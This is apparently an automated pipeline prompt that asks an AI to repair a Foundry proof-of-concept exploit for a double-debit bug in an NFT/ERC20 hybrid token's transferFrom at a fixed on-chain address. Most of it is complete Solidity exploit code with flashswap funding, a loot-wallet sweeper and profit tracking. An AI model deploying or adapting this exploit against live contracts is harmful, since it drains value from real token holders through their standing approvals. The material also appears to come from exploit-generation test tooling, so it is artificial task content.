You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: ERC721-style `transferFrom` debits two NFT-worths of ERC20 balance for one NFT transfer
- claim: When `value < _nextTokenId()`, `transferFrom` treats `value` as an NFT id, performs `_transfer(from, to, tokensPerNFT, false)`, then calls `_safeTransferFrom`, which performs a second `_transfer(from, to, tokensPerNFT, false)`. One NFT transfer therefore moves only one NFT id but debits and credits `2 * tokensPerNFT` fungible units.
- impact: Any owner, approved operator, or stale per-token approvee using the NFT branch of `transferFrom` can overcharge the sender by an extra whole-NFT worth of ERC20 balance. This breaks the ERC20/NFT backing invariant, gifts the recipient extra fungible value, and can strand the sender's remaining NFTs behind insufficient ERC20 balance. Holders with only one NFT-worth of balance cannot use this `transferFrom` path at all because the second debit reverts.
- exploit_paths: ["A holder owns NFT `id` and at least `2 * tokensPerNFT` fungible balance", "An authorized caller invokes `transferFrom(from, to, id)`", "The call transfers NFT `id` once but transfers `tokensPerNFT` fungible units twice"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IMinerTarget {
    function owner() external view returns (address);
    function tokensPerNFT() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function tokensOfOwner(address owner) external view returns (uint256[] memory);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function isApprovedForAll(address account, address operator) external view returns (bool);
    function getApproved(uint256 id) external view returns (address);
}

interface IUniswapV2LikePair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract LootWallet {
    constructor() {}

    function sweep(address target, address to) external {
        IMinerTarget token = IMinerTarget(target);

        // NFT-first is required here because F-001 makes NFT-path transferFrom consume
        // another whole-NFT worth of ERC20 balance. Sweeping fungible balance first can
        // strand the NFT inside the loot wallet behind an insufficient-balance revert.
        uint256[] memory ids = token.tokensOfOwner(address(this));
        for (uint256 i = 0; i < ids.length; ++i) {
            try token.transferFrom(address(this), to, ids[i]) returns (bool) {} catch {}
        }

        uint256 bal = token.balanceOf(address(this));
        if (bal != 0) {
            try token.transfer(to, bal) returns (bool) {} catch {}
        }
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD;
    bytes32 private constant LOOT_SALT = keccak256("miner-f001-loot");

    address private immutable _loot;
    uint256 private _profitAmount;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    address public exploitedFrom;
    uint256 public exploitedTokenId;

    address private _flashPair;
    address private _flashHolder;
    uint256 private _flashBorrowAmount;

    constructor() {
        _loot = _computeLootAddress();
    }

    function executeOnOpportunity() public {
        IMinerTarget target = IMinerTarget(TARGET);
        uint256 verifierBefore = target.balanceOf(address(this));
        uint256 unit = target.tokensPerNFT();

        _resetState();

        // Canonical exploit path, unchanged:
        // 1. Holder owns NFT `id` and has at least 2 * tokensPerNFT balance at transfer time.
        // 2. This verifier is the authorized caller and invokes transferFrom(holder, recipient, id).
        // 3. The target transfers one NFT id once, but moves 2 * tokensPerNFT fungible units.
        //
        // The verifier first tries directly-funded holders, then a bounded V2 flashswap top-up
        // for a real holder that already owns an NFT but is short of the second fungible unit,
        // and finally stale/historical approvals on locally-derivable third parties.

        if (_attemptPathFrom(target, msg.sender, address(this), unit)) {
            _finish(target, verifierBefore);
            return;
        }

        if (tx.origin != msg.sender && _attemptPathFrom(target, tx.origin, address(this), unit)) {
            _finish(target, verifierBefore);
            return;
        }

        // Keep the undeployed CREATE2 address as an EOA-like fallback if the collection
        // still treats contract recipients unfavorably.
        if (_attemptPathFrom(target, address(this), _loot, unit)) {
            _realizeLootIfPossible();
            _finish(target, verifierBefore);
            return;
        }

        _attemptFlashswapTopUp(target, unit);
        if (hypothesisValidated) {
            _finish(target, verifierBefore);
            return;
        }

        address owner = target.owner();
        if (_attemptPathFrom(target, owner, address(this), unit)) {
            _finish(target, verifierBefore);
            return;
        }

        if (_attemptPathFrom(target, owner, _loot, unit)) {
            _realizeLootIfPossible();
            _finish(target, verifierBefore);
            return;
        }

        _finish(target, verifierBefore);
    }

    // UniswapV2/Sushi-style callback used only for a realistic public-market top-up:
    // the holder must already own the NFT; the flashswap only supplies the missing ERC20
    // balance needed to survive the bug's second debit. Repayment is deterministic from
    // the recipient-side overcredit caused by the vulnerable transferFrom path.
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == _flashPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowed = amount0 != 0 ? amount0 : amount1;
        require(borrowed == _flashBorrowAmount, "unexpected borrow");

        IMinerTarget target = IMinerTarget(TARGET);
        require(_safeTargetTransfer(target, _flashHolder, borrowed), "top-up failed");

        bool ok = _attemptPathFrom(target, _flashHolder, address(this), target.tokensPerNFT());
        require(ok && hypothesisValidated, "path not realized");

        uint256 fee = _v2Fee(borrowed);
        require(_safeTargetTransfer(target, _flashPair, borrowed + fee), "repay failed");

        _clearFlash();
    }

    function profitToken() external pure returns (address) {
        return TARGET;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function lootAddress() external view returns (address) {
        return _loot;
    }

    function deployLootWallet() external returns (address deployed) {
        deployed = _deployLootWallet();
    }

    function _attemptFlashswapTopUp(IMinerTarget target, uint256 unit) internal {
        if (_attemptFlashswapTopUpFrom(target, msg.sender, unit)) {
            return;
        }

        if (tx.origin != msg.sender) {
            _attemptFlashswapTopUpFrom(target, tx.origin, unit);
        }
    }

    function _attemptFlashswapTopUpFrom(IMinerTarget target, address holder, uint256 unit) internal returns (bool) {
        if (holder == address(0) || holder == address(this) || holder == _loot) {
            return false;
        }

        (bool hasToken, uint256 tokenId) = _firstOwnedToken(target, holder);
        if (!hasToken) {
            return false;
        }

        if (!_isAuthorized(target, holder, tokenId)) {
            return false;
        }

        uint256 holderBalance = target.balanceOf(holder);
        uint256 neededForBug = unit * 2;
        if (holderBalance >= neededForBug) {
            return false;
        }

        uint256 borrowAmount = neededForBug - holderBalance;
        uint256 fee = _v2Fee(borrowAmount);
        if (holderBalance <= fee) {
            return false;
        }

        address pair = _findLocalPairCandidate(target);
        if (pair == address(0)) {
            return false;
        }

        (bool targetIsToken0, bool usable) = _pairTargetSide(pair);
        if (!usable) {
            return false;
        }

        _flashPair = pair;
        _flashHolder = holder;
        _flashBorrowAmount = borrowAmount;

        try
            IUniswapV2LikePair(pair).swap(
                targetIsToken0 ? borrowAmount : 0,
                targetIsToken0 ? 0 : borrowAmount,
                address(this),
                hex"01"
            )
        {
            return hypothesisValidated;
        } catch {
            _clearFlash();
            return false;
        }
    }

    function _attemptPathFrom(
        IMinerTarget target,
        address holder,
        address recipient,
        uint256 unit
    ) internal returns (bool) {
        if (holder == address(0) || recipient == address(0) || holder == recipient) {
            return false;
        }

        if (holder == _loot && recipient == address(this) && _loot.code.length == 0) {
            return false;
        }

        (bool hasToken, uint256 tokenId) = _firstOwnedToken(target, holder);
        if (!hasToken) {
            return false;
        }

        uint256 holderBefore = target.balanceOf(holder);
        if (holderBefore < unit * 2) {
            return false;
        }

        if (!_isAuthorized(target, holder, tokenId)) {
            return false;
        }

        uint256 recipientBefore = target.balanceOf(recipient);

        try target.transferFrom(holder, recipient, tokenId) returns (bool ok) {
            if (!ok) {
                return false;
            }
        } catch {
            return false;
        }

        uint256 holderAfter = target.balanceOf(holder);
        uint256 recipientAfter = target.balanceOf(recipient);

        if (holderAfter + (unit * 2) == holderBefore && recipientAfter == recipientBefore + (unit * 2)) {
            hypothesisValidated = true;
            exploitedFrom = holder;
            exploitedTokenId = tokenId;
        } else {
            hypothesisRefuted = true;
        }

        return true;
    }

    function _firstOwnedToken(IMinerTarget target, address owner) internal view returns (bool found, uint256 tokenId) {
        uint256[] memory owned = target.tokensOfOwner(owner);
        if (owned.length == 0) {
            return (false, 0);
        }

        return (true, owned[0]);
    }

    function _isAuthorized(IMinerTarget target, address owner, uint256 tokenId) internal view returns (bool) {
        if (owner == address(this)) {
            return true;
        }

        return target.isApprovedForAll(owner, address(this)) || target.getApproved(tokenId) == address(this);
    }

    function _safeTargetTransfer(IMinerTarget target, address to, uint256 amount) internal returns (bool) {
        try target.transfer(to, amount) returns (bool ok) {
            return ok;
        } catch {
            return false;
        }
    }

    function _findLocalPairCandidate(IMinerTarget target) internal view returns (address) {
        address owner = target.owner();
        if (_looksLikeTargetPair(owner)) {
            return owner;
        }

        if (_looksLikeTargetPair(msg.sender)) {
            return msg.sender;
        }

        if (tx.origin != msg.sender && _looksLikeTargetPair(tx.origin)) {
            return tx.origin;
        }

        return address(0);
    }

    function _looksLikeTargetPair(address candidate) internal view returns (bool) {
        (, bool usable) = _pairTargetSide(candidate);
        return usable;
    }

    function _pairTargetSide(address pair) internal view returns (bool targetIsToken0, bool usable) {
        if (pair == address(0) || pair.code.length == 0) {
            return (false, false);
        }

        try IUniswapV2LikePair(pair).token0() returns (address token0) {
            try IUniswapV2LikePair(pair).token1() returns (address token1) {
                if (token0 == TARGET) {
                    return (true, true);
                }

                if (token1 == TARGET) {
                    return (false, true);
                }
            } catch {}
        } catch {}

        return (false, false);
    }

    function _realizeLootIfPossible() internal {
        if (_loot.code.length == 0) {
            _deployLootWallet();
        }

        try LootWallet(_loot).sweep(TARGET, address(this)) {} catch {}
    }

    function _finish(IMinerTarget target, uint256 verifierBefore) internal {
        _profitAmount = _netVerifierGain(target, verifierBefore);
    }

    function _netVerifierGain(IMinerTarget target, uint256 verifierBefore) internal view returns (uint256) {
        uint256 verifierAfter = target.balanceOf(address(this));
        if (verifierAfter <= verifierBefore) {
            return 0;
        }

        return verifierAfter - verifierBefore;
    }

    function _resetState() internal {
        _profitAmount = 0;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        exploitedFrom = address(0);
        exploitedTokenId = 0;
        _clearFlash();
    }

    function _clearFlash() internal {
        _flashPair = address(0);
        _flashHolder = address(0);
        _flashBorrowAmount = 0;
    }

    function _v2Fee(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 3) / 997) + 1;
    }

    function _deployLootWallet() internal returns (address deployed) {
        if (_loot.code.length != 0) {
            return _loot;
        }

        deployed = address(new LootWallet{salt: LOOT_SALT}());
        require(deployed == _loot, "loot mismatch");
    }

    function _computeLootAddress() internal view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                LOOT_SALT,
                keccak256(type(LootWallet).creationCode)
            )
        );
        return address(uint160(uint256(hash)));
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
